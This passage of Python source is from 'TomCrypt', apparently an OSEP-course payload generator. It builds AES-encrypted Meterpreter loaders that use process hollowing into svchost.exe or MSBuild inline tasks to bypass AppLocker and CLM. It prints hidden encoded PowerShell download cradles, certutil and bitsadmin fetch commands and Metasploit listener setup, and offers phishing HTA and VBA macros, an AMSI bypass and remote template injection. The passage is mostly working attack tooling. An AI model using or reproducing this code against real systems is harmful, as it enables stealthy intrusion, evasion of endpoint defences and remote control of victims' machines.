    # Build and write output
    if fmt == "exe":
        cs_code  = (build_cs_hollow_x64(result, cfg) if arch == "x64"
                    else build_cs_simple_x86(result, cfg))
        cs_path  = basedir / f"{stem}.cs"
        cs_path.write_text(cs_code, encoding="utf-8")
        print(ok(f"Source   : {cs_path}"))
        exe_path = compile_cs(cs_path, arch)
        out_name = exe_path.name
        cradle   = (
            f"$d=(New-Object Net.WebClient).DownloadData('{serve_url}/{out_name}');"
            f"[Reflection.Assembly]::Load($d).EntryPoint.Invoke($null,$null)"
        )

    else:  # ps1 or txt
        ps1_code = (build_ps1_hollow_x64(result, cfg) if arch == "x64"
                    else build_ps1_simple_x86(result, cfg))
        out_path = basedir / f"{stem}.{fmt}"
        out_path.write_text(ps1_code, encoding="utf-8")
        print(ok(f"Output   : {out_path}"))
        out_name = out_path.name
        cradle   = f"IEX (New-Object Net.WebClient).DownloadString('{serve_url}/{out_name}')"

    import base64
    enc = base64.b64encode(cradle.encode("utf-16le")).decode()

    listener = (
        f"msfconsole -q -x 'use multi/handler; "
        f"set payload {cfg.payload}; "
        f"set LHOST {cfg.lhost}; "
        f"set LPORT {cfg.lport}; "
        f"set ExitOnSession false; run -j'"
    )

    print()
    print(_SEP)
    print(ok("DELIVERY"))
    print(_SEP)
    print(info("Serve    : python3 -m http.server 80"))
    print()
    print(ok("Cradle (no disk touch):"))
    print(f"  {cradle}")
    print()
    print(ok("Encoded cradle (powershell -enc):"))
    print(f"  powershell -nop -w hidden -enc {enc}")
    print()
    print(ok("Listener :"))
    print(f"  {listener}")
    if arch == "x86":
        print(hint("  x86: cradle must run inside a 32-bit PS process (use %SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe)"))
    print(_SEP)



# ══════════════════════════════════════════════════════════════════════════════
# Builders - MSBuild XML
# ══════════════════════════════════════════════════════════════════════════════

def build_xml_hollow_x64(result: EncryptResult, cfg: Config) -> str:
    """MSBuild inline task - x64 process hollowing."""
    cls          = rand_id()
    fn           = rand_id()
    e, k, v, sc = rand_id(), rand_id(), rand_id(), rand_id()
    junk         = rand_junk()

    cs_lines = [
        "using System;",
        "using System.Runtime.InteropServices;",
        "using Microsoft.Build.Framework;",
        "using Microsoft.Build.Utilities;",
        "",
        "public class " + cls + " : Task {",
        "    [DllImport(\"kernel32.dll\", CharSet = CharSet.Ansi, ExactSpelling = true)]",
        "    static extern IntPtr GetProcAddress(IntPtr h, string n);",
        "    [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto)]",
        "    static extern IntPtr GetModuleHandle(string n);",
        "    [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto)]",
        "    static extern IntPtr LoadLibrary(string n);",
        "",
        "    [DllImport(\"advapi32.dll\", SetLastError = true)]",
        "    static extern bool CryptAcquireContext(out IntPtr hProv, string c, string p, uint t, uint f);",
        "    [DllImport(\"advapi32.dll\", SetLastError = true)]",
        "    static extern bool CryptImportKey(IntPtr hProv, byte[] d, uint l, IntPtr pub, uint f, out IntPtr hKey);",
        "    [DllImport(\"advapi32.dll\", SetLastError = true)]",
        "    static extern bool CryptSetKeyParam(IntPtr hKey, uint p, byte[] d, uint f);",
        "    [DllImport(\"advapi32.dll\", SetLastError = true)]",
        "    static extern bool CryptDecrypt(IntPtr hKey, IntPtr hHash, bool fin, uint f, byte[] d, ref uint l);",
        "    [DllImport(\"advapi32.dll\", SetLastError = true)]",
        "    static extern bool CryptDestroyKey(IntPtr h);",
        "    [DllImport(\"advapi32.dll\", SetLastError = true)]",
        "    static extern bool CryptReleaseContext(IntPtr h, uint f);",
        "",
        "    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]",
        "    struct STARTUPINFO {",
        "        public int    cb;",
        "        public string lpReserved, lpDesktop, lpTitle;",
        "        public uint   dwX, dwY, dwXSize, dwYSize,",
        "                      dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;",
        "        public short  wShowWindow, cbReserved2;",
        "        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;",
        "    }",
        "    [StructLayout(LayoutKind.Sequential)]",
        "    struct PROCESS_INFORMATION {",
        "        public IntPtr hProcess, hThread;",
        "        public uint   dwProcessId, dwThreadId;",
        "    }",
        "    [StructLayout(LayoutKind.Explicit, Size = 1232)]",
        "    struct CONTEXT {",
        "        [FieldOffset(0x30)] public uint  ContextFlags;",
        "        [FieldOffset(0xF8)] public ulong Rip;",
        "    }",
        "",
        "    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]",
        "    delegate bool CreateProcessW_t(string app, string cmd, IntPtr pa, IntPtr ta,",
        "        bool inherit, uint flags, IntPtr env, string dir,",
        "        [In] ref STARTUPINFO si, out PROCESS_INFORMATION pi);",
        "    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]",
        "    delegate IntPtr VirtualAllocEx_t(IntPtr h, IntPtr addr, uint size, uint type, uint prot);",
        "    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]",
        "    delegate bool WriteProcessMemory_t(IntPtr h, IntPtr base_, byte[] buf, uint size, out IntPtr written);",
        "    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]",
        "    delegate bool VirtualProtectEx_t(IntPtr h, IntPtr addr, uint size, uint prot, out uint old);",
        "    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]",
        "    delegate bool GetThreadContext_t(IntPtr h, [In, Out] ref CONTEXT ctx);",
        "    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]",
        "    delegate bool SetThreadContext_t(IntPtr h, [In] ref CONTEXT ctx);",
        "    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]",
        "    delegate uint ResumeThread_t(IntPtr h);",
        "    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]",
        "    delegate bool CloseHandle_t(IntPtr h);",
        "",
        "    static T R<T>(string mod, string name) where T : class {",
        "        IntPtr h = GetModuleHandle(mod);",
        "        if (h == IntPtr.Zero) h = LoadLibrary(mod);",
        "        IntPtr p = GetProcAddress(h, name);",
        "        return p == IntPtr.Zero ? null : (T)(object)Marshal.GetDelegateForFunctionPointer(p, typeof(T));",
        "    }",
        "",
        _cs_decrypt_func(fn, e, k, v),
        "",
        "    public override bool Execute() {",
        "        try {",
        "            " + cs_byte_array(e, result.ciphertext),
        "            " + cs_byte_array(k, result.key),
        "            " + cs_byte_array(v, result.iv),
        "            byte[] " + sc + " = " + fn + "(" + e + ", " + k + ", " + v + ");",
        "",
        "            var pCP  = R<CreateProcessW_t>     (\"kernel32.dll\", \"CreateProcessW\");",
        "            var pVAX = R<VirtualAllocEx_t>     (\"kernel32.dll\", \"VirtualAllocEx\");",
        "            var pWPM = R<WriteProcessMemory_t> (\"kernel32.dll\", \"WriteProcessMemory\");",
        "            var pVPX = R<VirtualProtectEx_t>   (\"kernel32.dll\", \"VirtualProtectEx\");",
        "            var pGTC = R<GetThreadContext_t>   (\"kernel32.dll\", \"GetThreadContext\");",
        "            var pSTC = R<SetThreadContext_t>   (\"kernel32.dll\", \"SetThreadContext\");",
        "            var pRT  = R<ResumeThread_t>       (\"kernel32.dll\", \"ResumeThread\");",
        "            var pCH  = R<CloseHandle_t>        (\"kernel32.dll\", \"CloseHandle\");",
        "            if (pCP==null||pVAX==null||pWPM==null||pVPX==null||",
        "                pGTC==null||pSTC==null||pRT==null||pCH==null) return true;",
        "",
        "            var si = new STARTUPINFO();",
        "            si.cb  = Marshal.SizeOf(si);",
        "            PROCESS_INFORMATION pi;",
        "            if (!pCP(@\"" + cfg.target + "\", null, IntPtr.Zero, IntPtr.Zero,",
        "                     false, 0x4, IntPtr.Zero, null, ref si, out pi)) return true;",
        "",
        "            IntPtr remote = pVAX(pi.hProcess, IntPtr.Zero, (uint)" + sc + ".Length, 0x3000, 0x04);",
        "            if (remote == IntPtr.Zero) { pCH(pi.hProcess); pCH(pi.hThread); return true; }",
        "",
        "            IntPtr written;",
        "            pWPM(pi.hProcess, remote, " + sc + ", (uint)" + sc + ".Length, out written);",
        "",
        "            uint old;",
        "            pVPX(pi.hProcess, remote, (uint)" + sc + ".Length, 0x20, out old);",
        "",
        "            var ctx = new CONTEXT();",
        "            ctx.ContextFlags = 0x100001;",
        "            pGTC(pi.hThread, ref ctx);",
        "            ctx.Rip = (ulong)remote.ToInt64();",
        "            pSTC(pi.hThread, ref ctx);",
        "",
        "            pRT(pi.hThread);",
        "            pCH(pi.hProcess);",
        "            pCH(pi.hThread);",
        "        }",
        "        catch { }",
        "        return true;",
        "    }",
        "}",
    ]
    cs = "\n".join(cs_lines)

    xml = (
        f"<!-- TomCrypt v{__version__} - MSBuild Hollow Loader (x64) | {junk} -->\n"
        f"<!-- Payload: {cfg.payload} | LHOST: {cfg.lhost} | LPORT: {cfg.lport} -->\n"
        f"<!-- Target: {cfg.target} | Encrypt: AES-256-CBC -->\n"
        '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n'
        f'  <Target Name="x">\n'
        f'    <{cls} />\n'
        f'  </Target>\n'
        f'  <UsingTask TaskName="{cls}" TaskFactory="CodeTaskFactory"\n'
        f'    AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll">\n'
        f'    <Task>\n'
        f'      <Code Type="Class" Language="cs"><![CDATA[\n'
        f'{cs}\n'
        f'      ]]></Code>\n'
        f'    </Task>\n'
        f'  </UsingTask>\n'
        f'</Project>\n'
    )
    return xml


def build_xml_simple_x86(result: EncryptResult, cfg: Config) -> str:
    """MSBuild inline task - x86 self-injection fallback."""
    cls          = rand_id()
    fn           = rand_id()
    e, k, v, sc = rand_id(), rand_id(), rand_id(), rand_id()
    junk         = rand_junk()

    cs_lines = [
        "using System;",
        "using System.Runtime.InteropServices;",
        "using Microsoft.Build.Framework;",
        "using Microsoft.Build.Utilities;",
        "",
        "public class " + cls + " : Task {",
        "    [DllImport(\"kernel32.dll\", CharSet = CharSet.Ansi, ExactSpelling = true)]",
        "    static extern IntPtr GetProcAddress(IntPtr h, string n);",
        "    [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto)]",
        "    static extern IntPtr GetModuleHandle(string n);",
        "    [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto)]",
        "    static extern IntPtr LoadLibrary(string n);",
        "",
        "    [DllImport(\"advapi32.dll\", SetLastError = true)]",
        "    static extern bool CryptAcquireContext(out IntPtr hProv, string c, string p, uint t, uint f);",
        "    [DllImport(\"advapi32.dll\", SetLastError = true)]",
        "    static extern bool CryptImportKey(IntPtr hProv, byte[] d, uint l, IntPtr pub, uint f, out IntPtr hKey);",
        "    [DllImport(\"advapi32.dll\", SetLastError = true)]",
        "    static extern bool CryptSetKeyParam(IntPtr hKey, uint p, byte[] d, uint f);",
        "    [DllImport(\"advapi32.dll\", SetLastError = true)]",
        "    static extern bool CryptDecrypt(IntPtr hKey, IntPtr hHash, bool fin, uint f, byte[] d, ref uint l);",
        "    [DllImport(\"advapi32.dll\", SetLastError = true)]",
        "    static extern bool CryptDestroyKey(IntPtr h);",
        "    [DllImport(\"advapi32.dll\", SetLastError = true)]",
        "    static extern bool CryptReleaseContext(IntPtr h, uint f);",
        "",
        "    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]",
        "    delegate IntPtr VirtualAlloc_t(IntPtr addr, uint size, uint type, uint prot);",
        "    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]",
        "    delegate bool VirtualProtect_t(IntPtr addr, uint size, uint prot, out uint old);",
        "    [UnmanagedFunctionPointer(CallingConvention.StdCall)]",
        "    delegate IntPtr CreateThread_t(IntPtr ta, uint stack, IntPtr start, IntPtr param, uint flags, out IntPtr tid);",
        "    [UnmanagedFunctionPointer(CallingConvention.StdCall)]",
        "    delegate uint WaitForSingleObject_t(IntPtr h, uint ms);",
        "",
        "    static T R<T>(string mod, string name) where T : class {",
        "        IntPtr h = GetModuleHandle(mod);",
        "        if (h == IntPtr.Zero) h = LoadLibrary(mod);",
        "        IntPtr p = GetProcAddress(h, name);",
        "        return p == IntPtr.Zero ? null : (T)(object)Marshal.GetDelegateForFunctionPointer(p, typeof(T));",
        "    }",
        "",
        _cs_decrypt_func(fn, e, k, v),
        "",
        "    public override bool Execute() {",
        "        try {",
        "            " + cs_byte_array(e, result.ciphertext),
        "            " + cs_byte_array(k, result.key),
        "            " + cs_byte_array(v, result.iv),
        "            byte[] " + sc + " = " + fn + "(" + e + ", " + k + ", " + v + ");",
        "",
        "            var pVA   = R<VirtualAlloc_t>       (\"kernel32.dll\", \"VirtualAlloc\");",
        "            var pVP   = R<VirtualProtect_t>     (\"kernel32.dll\", \"VirtualProtect\");",
        "            var pCT   = R<CreateThread_t>       (\"kernel32.dll\", \"CreateThread\");",
        "            var pWFSO = R<WaitForSingleObject_t>(\"kernel32.dll\", \"WaitForSingleObject\");",
        "            if (pVA==null||pVP==null||pCT==null||pWFSO==null) return true;",
        "",
        "            IntPtr addr = pVA(IntPtr.Zero, (uint)" + sc + ".Length, 0x3000, 0x04);",
        "            if (addr == IntPtr.Zero) return true;",
        "            Marshal.Copy(" + sc + ", 0, addr, " + sc + ".Length);",
        "",
        "            uint old;",
        "            pVP(addr, (uint)" + sc + ".Length, 0x20, out old);",
        "",
        "            IntPtr tid;",
        "            IntPtr ht = pCT(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out tid);",
        "            if (ht == IntPtr.Zero) return true;",
        "            pWFSO(ht, 0xFFFFFFFF);",
        "        }",
        "        catch { }",
        "        return true;",
        "    }",
        "}",
    ]
    cs = "\n".join(cs_lines)

    xml = (
        f"<!-- TomCrypt v{__version__} - MSBuild Self-Injection (x86) | {junk} -->\n"
        f"<!-- Payload: {cfg.payload} | LHOST: {cfg.lhost} | LPORT: {cfg.lport} -->\n"
        f"<!-- x86 self-injecting | Encrypt: AES-256-CBC -->\n"
        '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n'
        f'  <Target Name="x">\n'
        f'    <{cls} />\n'
        f'  </Target>\n'
        f'  <UsingTask TaskName="{cls}" TaskFactory="CodeTaskFactory"\n'
        f'    AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll">\n'
        f'    <Task>\n'
        f'      <Code Type="Class" Language="cs"><![CDATA[\n'
        f'{cs}\n'
        f'      ]]></Code>\n'
        f'    </Task>\n'
        f'  </UsingTask>\n'
        f'</Project>\n'
    )
    return xml


# ══════════════════════════════════════════════════════════════════════════════
# msbuild subcommand handler
# ══════════════════════════════════════════════════════════════════════════════

def cmd_msbuild(args: argparse.Namespace) -> None:
    lhost = resolve_lhost(args.lhost)
    cfg   = Config(
        payload = args.payload,
        lhost   = lhost,
        lport   = args.lport,
        target  = args.target,
        output  = Path(args.output) if args.output else None,
    )

    arch = resolve_arch(cfg.payload, getattr(args, "arch", None))

    if arch == "x86":
        print(warn("x86 payload - hollow not supported, falling back to self-injection."))

    print(ok(f"TomCrypt v{__version__} [msbuild]"))
    print(info(f"Payload  : {cfg.payload}"))
    print(info(f"Arch     : {arch}"))
    print(info(f"LHOST    : {cfg.lhost}"))
    print(info(f"LPORT    : {cfg.lport}"))
    if arch == "x64":
        print(info(f"Target   : {cfg.target}"))
    print(info("Encrypt  : AES-256-CBC"))
    print(info("Output   : MSBuild inline task (.xml)"))

    shellcode = run_msfvenom(cfg, arch)
    print(info(f"Shellcode: {len(shellcode):,} B"))
    result = encrypt_aes256(shellcode)
    print(info(f"Encrypted: {result.original_len:,} B -> {len(result.ciphertext):,} B ciphertext"))

    default_stem = "HollowLoader" if arch == "x64" else "SimpleLoader"
    stem    = cfg.output.stem if cfg.output else default_stem
    basedir = cfg.output.parent if cfg.output else Path.cwd()

    xml_code = (build_xml_hollow_x64(result, cfg) if arch == "x64"
                else build_xml_simple_x86(result, cfg))

    xml_path = basedir / f"{stem}.xml"
    xml_path.write_text(xml_code, encoding="utf-8")
    print(ok(f"Output   : {xml_path}"))

    fw  = "Framework64" if arch == "x64" else "Framework"
    msb = r"C:\Windows\Microsoft.NET" + "\\" + fw + r"\v4.0.30319\MSBuild.exe"
    tgt = r"C:\Users\Public" + "\\" + xml_path.name

    listener = (
        f"msfconsole -q -x 'use multi/handler; "
        f"set payload {cfg.payload}; "
        f"set LHOST {cfg.lhost}; "
        f"set LPORT {cfg.lport}; "
        f"set ExitOnSession false; run -j'"
    )

    tgt_meterp  = tgt.replace("\\", "\\\\")
    serve_url   = f"http://{cfg.lhost}"
    file_url    = f"{serve_url}/{xml_path.name}"

    print()
    print(_SEP)
    print(ok("DELIVERY"))
    print(_SEP)
    print(info("Step 1 - Transfer the XML (pick one):"))
    print(hint(f"  Meterpreter : upload {xml_path} {tgt_meterp}"))
    print(hint(f"  certutil    : certutil -urlcache -f {file_url} {tgt}"))
    print(hint(f"  curl (W10+) : curl -o {tgt} {file_url}"))
    print(hint(f"  bitsadmin   : bitsadmin /transfer n {file_url} {tgt}"))
    print()
    print(info("HTTP options require serving first:"))
    print(hint(f"  python3 -m http.server 80   (in {basedir})"))
    print()
    print(info("Step 2 - Execute (pick one):"))
    print(hint(f"  cmd / shell : {msb} {tgt}"))
    print(hint(f"  CLM PS      : & '{msb}' '{tgt}'"))
    print()
    print(ok("Listener :"))
    print(f"  {listener}")
    print(_SEP)


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="tomcrypt",
        description=f"TomCrypt v{__version__} - OSEP payload generator",
    )
    p.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    sub = p.add_subparsers(dest="command", required=True)

    h = sub.add_parser(
        "hollow",
        help="AES-256-CBC shellcode runner — exe: D/Invoke process hollowing; ps1/txt: AMSI bypass + cross-process inject (x64) / self-inject (x86).",
    )
    h.add_argument("-H", "--lhost", required=True, metavar="HOST",
                   help="LHOST: IP or interface name (e.g. tun0)")
    h.add_argument("-P", "--lport", type=int, default=443, metavar="PORT",
                   help="LPORT (default: 443)")
    h.add_argument("-p", "--payload", default="windows/x64/meterpreter/reverse_tcp",
                   metavar="PAYLOAD", help="msfvenom payload string")
    h.add_argument("-a", "--arch", choices=["x64", "x86"], default=None,
                   metavar="ARCH", help="Architecture (x64 or x86). Inferred from -p if omitted. Must match payload.")
    h.add_argument("-f", "--format", choices=["exe", "ps1", "txt"], default="exe",
                   metavar="FORMAT", help="exe: D/Invoke hollow (compiled); ps1/txt: AMSI bypass + inject via IEX cradle  (default: exe)")
    h.add_argument("-t", "--target", default=r"C:\Windows\System32\svchost.exe",
                   metavar="PATH", help="Injection target (default: svchost.exe). ps1/txt: target must stay alive — notepad.exe is reliable; svchost.exe exits quickly without SCM args.")
    h.add_argument("-o", "--output", metavar="PATH",
                   help="Output path stem, e.g. /tmp/payload (extension added automatically)")

    m = sub.add_parser(
        "msbuild",
        help="MSBuild inline task (.xml) - bypasses CLM, executes via MSBuild.exe LOLBAS",
    )
    m.add_argument("-H", "--lhost", required=True, metavar="HOST",
                   help="LHOST: IP or interface name (e.g. tun0)")
    m.add_argument("-P", "--lport", type=int, default=443, metavar="PORT",
                   help="LPORT (default: 443)")
    m.add_argument("-p", "--payload", default="windows/x64/meterpreter/reverse_tcp",
                   metavar="PAYLOAD", help="msfvenom payload string")
    m.add_argument("-a", "--arch", choices=["x64", "x86"], default=None,
                   metavar="ARCH", help="Architecture (x64 or x86). Inferred from -p if omitted. Must match payload.")
    m.add_argument("-t", "--target", default=r"C:\Windows\System32\svchost.exe",
                   metavar="PATH", help="Target process for shellcode injection (default: svchost.exe).")
    m.add_argument("-o", "--output", metavar="PATH",
                   help="Output path stem, e.g. /tmp/payload (extension added automatically)")

    # ── hta ──────────────────────────────────────────────────────────────────
    hta_p   = sub.add_parser("hta",
                              help="HTA payload generators")
    hta_sub = hta_p.add_subparsers(dest="hta_command", required=True)

    he = hta_sub.add_parser("enum",
        help="Reconnaissance HTA — collects hostname, user, domain, OS/process arch "
             "and current process, POSTs back via curl or WinHttp, then closes.")
    he.add_argument("-H", "--lhost", required=True, metavar="HOST",
        help="Your Kali IP or interface (e.g. tun0). The HTA POSTs all recon data here.")
    he.add_argument("--recv-port", type=int, default=80, metavar="PORT",
        help="Port to receive the POST on (default: 80). Receive with: nc -lvnp PORT.")
    he.add_argument("-o", "--output", metavar="PATH",
        help="Where to write the .hta file (default: HostEnum.hta in current directory).")

    hp = hta_sub.add_parser("ping",
        help="Minimal confirmation HTA — one WinHttp POST with unique token, then closes. "
             "Highest reliability for initial phishing.")
    hp.add_argument("-H", "--lhost", required=True, metavar="HOST",
        help="Your Kali IP or interface. The HTA POSTs the token here.")
    hp.add_argument("--recv-port", type=int, default=80, metavar="PORT",
        help="Port to receive the POST on (default: 80).")
    hp.add_argument("--token", metavar="STR",
        help="Custom token to include in the ping (default: random).")
    hp.add_argument("-o", "--output", metavar="PATH",
        help="Where to write the .hta file (default: Ping.hta).")

    hm = hta_sub.add_parser("msbuild",
        help="MSBuild.exe bypass — AES-encrypted C# inline task in XML, compiled and "
             "executed on target by MSBuild.exe. No Kali compilation. "
             "Bypasses CLM and AppLocker.")
    hm.add_argument("-H", "--lhost", required=True, metavar="HOST",
        help="Your Kali IP or interface.")
    hm.add_argument("-P", "--lport", type=int, default=443, metavar="PORT",
        help="LPORT for the meterpreter handler (default: 443).")
    hm.add_argument("-p", "--payload", default="windows/x64/meterpreter/reverse_tcp",
        metavar="PAYLOAD", help="msfvenom payload string.")
    hm.add_argument("-a", "--arch", choices=["x64", "x86"], default=None,
        metavar="ARCH", help="Architecture (x64 or x86). Inferred from -p if omitted. Must match payload.")
    hm.add_argument("-t", "--target", default=r"C:\Windows\System32\svchost.exe",
        metavar="PATH", help="Process to hollow into (default: svchost.exe).")
    hm.add_argument("--serve-port", type=int, default=80, metavar="PORT",
        help="Port your HTTP server is listening on (default: 80).")
    hm.add_argument("--drop-path", default=r"C:\Users\Public", metavar="PATH",
        help=r"Writable directory on the target (default: C:\Users\Public).")
    hm.add_argument("-o", "--output", metavar="PATH",
        help="Output stem — generates <stem>.xml and <stem>_delivery.hta "
             "(default: payload in current directory).")

    hc = hta_sub.add_parser("installutil",
        help="InstallUtil.exe /U bypass — AES-encrypted Installer subclass compiled on Kali, "
             "certutil-encoded, delivered via HTA. Full pipeline: msfvenom, encrypt, "
             "mcs compile, encode, HTA. Bypasses CLM and AppLocker.")
    hc.add_argument("-H", "--lhost", required=True, metavar="HOST",
        help="Your Kali IP or interface.")
    hc.add_argument("-P", "--lport", type=int, default=443, metavar="PORT",
        help="LPORT for the meterpreter handler (default: 443).")
    hc.add_argument("-p", "--payload", default="windows/x64/meterpreter/reverse_tcp",
        metavar="PAYLOAD", help="msfvenom payload string.")
    hc.add_argument("-a", "--arch", choices=["x64", "x86"], default=None,
        metavar="ARCH", help="Architecture (x64 or x86). Inferred from -p if omitted. Must match payload.")
    hc.add_argument("-t", "--target", default=r"C:\Windows\System32\svchost.exe",
        metavar="PATH", help="Process to hollow into (default: svchost.exe).")
    hc.add_argument("--serve-port", type=int, default=80, metavar="PORT",
        help="Port your HTTP server is listening on (default: 80).")
    hc.add_argument("--drop-path", default=r"C:\Users\Public", metavar="PATH",
        help=r"Writable directory on target (default: C:\Users\Public).")
    hc.add_argument("-o", "--output", metavar="PATH",
        help="Output stem — generates <stem>.cs, <stem>.exe, <stem>.txt and "
             "<stem>_delivery.hta (default: payload in current directory).")

    # ── vba ──────────────────────────────────────────────────────────────────
    vba_p   = sub.add_parser("vba",
                             help="VBA macro generators - enum, ping, mini, runner, cradle, rti")
    vba_sub = vba_p.add_subparsers(dest="vba_command", required=True)

    ve = vba_sub.add_parser("enum",
        help="Reconnaissance macro.")
    ve.add_argument("-H", "--lhost", required=True, metavar="HOST")
    ve.add_argument("--recv-port", type=int, default=80, metavar="PORT")
    ve.add_argument("-o", "--output", metavar="PATH")

    vp = vba_sub.add_parser("ping",
        help="Minimal confirmation macro — one WinHttp POST with unique token. "
             "Highest reliability for initial phishing.")
    vp.add_argument("-H", "--lhost", required=True, metavar="HOST")
    vp.add_argument("--recv-port", type=int, default=80, metavar="PORT")
    vp.add_argument("--token", metavar="STR",
        help="Custom token to include in the ping (default: random).")
    vp.add_argument("-o", "--output", metavar="PATH")

    vr = vba_sub.add_parser("runner",
        help="Self-contained shellcode runner.")
    vr.add_argument("-H", "--lhost", required=True, metavar="HOST")
    vr.add_argument("-P", "--lport", type=int, default=443, metavar="PORT")
    vr.add_argument("-p", "--payload", default="windows/x64/meterpreter/reverse_tcp")
    vr.add_argument("-a", "--arch", choices=["x64", "x86"], default=None,
        metavar="ARCH", help="Architecture (x64 or x86). Inferred from -p if omitted. Must match payload and Word bitness.")
    vr.add_argument("-o", "--output", metavar="PATH")

    vs = vba_sub.add_parser("cradle",
        help="Download-and-execute cradle.")
    vs.add_argument("-H", "--lhost", required=True, metavar="HOST")
    vs.add_argument("-P", "--lport", type=int, default=443, metavar="PORT")
    vs.add_argument("-p", "--payload", default="windows/x64/meterpreter/reverse_tcp")
    vs.add_argument("-a", "--arch", choices=["x64", "x86"], default=None,
        metavar="ARCH", help="Architecture (x64 or x86). Inferred from -p if omitted. Must match payload.")
    vs.add_argument("-f", "--format", choices=["exe", "ps1", "txt"], default="exe",
        metavar="FORMAT")
    vs.add_argument("-t", "--target", default=r"C:\Windows\System32\svchost.exe",
        metavar="PATH")
    vs.add_argument("-o", "--output", metavar="PATH")

    vm = vba_sub.add_parser("mini",
        help="Minimal download cradle. VBA runs encoded PowerShell that IEX(IWR)s a .txt.",
        epilog="Examples:\n"
               "  python3 tomcrypt.py vba mini -H 192.168.45.163 --mode rev --amsi\n"
               "  python3 tomcrypt.py vba mini -H 192.168.45.163 --mode exe --amsi\n"
               "  python3 tomcrypt.py vba mini -H 192.168.45.163 -P 8443 --mode rev --amsi -o shell1",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    vm.add_argument("-H", "--lhost", required=True, metavar="HOST")
    vm.add_argument("-P", "--lport", type=int, default=443, metavar="PORT")
    vm.add_argument("-p", "--payload", default="windows/x64/meterpreter/reverse_tcp")
    vm.add_argument("-a", "--arch", choices=["x64", "x86"], default=None,
        metavar="ARCH", help="Architecture for --mode ps1 (x64 or x86).")
    vm.add_argument("--mode", choices=["rev", "exe", "ps1"], default="rev",
        metavar="MODE",
        help="rev: PowerShell reverse shell (default, reliable). "
             "exe: download and Start-Process an exe (reliable). "
             "ps1: full TomCrypt PS1 runner (often flagged).")
    vm.add_argument("--amsi", action="store_true",
        help="Prepend TrollAMSI bypass to the .txt (applies to all modes).")
    vm.add_argument("-o", "--output", metavar="PATH")

    vr_rti = vba_sub.add_parser("rti",
        help="Remote Template Injection. Builds a macro-free lure .docx plus the VBA "
             "you paste into a .dotm on Windows. Word sends OPTIONS before GET; serve "
             "with the generated *_serve.py, not python -m http.server.")
    vr_rti.add_argument("-H", "--lhost", required=True, metavar="HOST")
    vr_rti.add_argument("-P", "--lport", type=int, default=443, metavar="PORT")
    vr_rti.add_argument("-a", "--arch", choices=["x64", "x86"], default=None,
        help="Shellcode architecture. Must match the target Word bitness "
             "(File > Account > About Word), not the OS. "
             "x64 default payload: windows/x64/meterpreter/reverse_tcp. "
             "x86 default payload: windows/meterpreter/reverse_tcp. "
             "Inferred from -p when -a is omitted.")
    vr_rti.add_argument("-p", "--payload", default=None,
        help="msfvenom payload. Omit to use the default for -a "
             "(x64 if both -a and -p are omitted).")
    vr_rti.add_argument("--serve-port", type=int, default=80, metavar="PORT",
        help="Port the RTI server listens on for the .dotm (default: 80).")
    vr_rti.add_argument("--ping", action="store_true",
        help="Generate a minimal confirmation ping VBA instead of a shellcode runner.")
    vr_rti.add_argument("--enum", action="store_true",
        help="Generate a lightweight recon VBA (process, arch, user) instead of a shellcode runner.")
    vr_rti.add_argument("--cradle", action="store_true",
        help="Generate a download-and-execute cradle VBA (pulls an exe you host) instead of an embedded shellcode runner.")
    vr_rti.add_argument("-f", "--format", choices=["exe", "ps1"], default="exe",
        metavar="FORMAT", help="Payload format for --cradle (default: exe).")
    vr_rti.add_argument("--recv-port", type=int, default=8080, metavar="PORT",
        help="Port for the callback when --ping or --enum is used (default: 8080). "
             "Must be different from --serve-port.")
    vr_rti.add_argument("--token", metavar="STR",
        help="Custom token for --ping (default: random). Ignored for --enum and shellcode modes.")
    vr_rti.add_argument("-o", "--output", metavar="PATH")

    lig = sub.add_parser(
        "ligolo",
        help="Ligolo-ng tunnel — donut converts agent.exe to shellcode, AES-256-CBC "
             "encrypts, embeds in MSBuild XML (CLM bypass). Connect parameters "
             "baked in at generation time; target runs one MSBuild command.",
    )
    lig.add_argument("-H", "--lhost", required=True, metavar="HOST",
        help="Kali IP or interface. Baked into donut as -connect IP:PORT.")
    lig.add_argument("-P", "--lport", type=int, default=11601, metavar="PORT",
        help="Ligolo-ng port (default: 11601).")
    lig.add_argument("-i", "--agent", default="agent.exe", metavar="FILE",
        help="Path to agent.exe (default: agent.exe in current directory).")
    lig.add_argument("-f", "--format", choices=["xml"], default="xml",
        metavar="FORMAT", help="Output format: xml (default). ps1/exe to follow.")
    lig.add_argument("-t", "--target", default=r"C:\Windows\System32\svchost.exe",
        metavar="PATH", help="Target process for shellcode injection (default: svchost.exe).")
    lig.add_argument("-o", "--output", metavar="PATH",
        help="Output stem (default: ligolo in current directory).")

    # ── linux ─────────────────────────────────────────────────────────────────
    lnx = sub.add_parser(
        "linux",
        help="msfvenom -f elf wrapper — ready-to-run ELF reverse shell. "
             "No custom loaders, no OpenSSL, no extra libraries on the target.",
    )
    lnx.add_argument("-H", "--lhost", required=True, metavar="HOST",
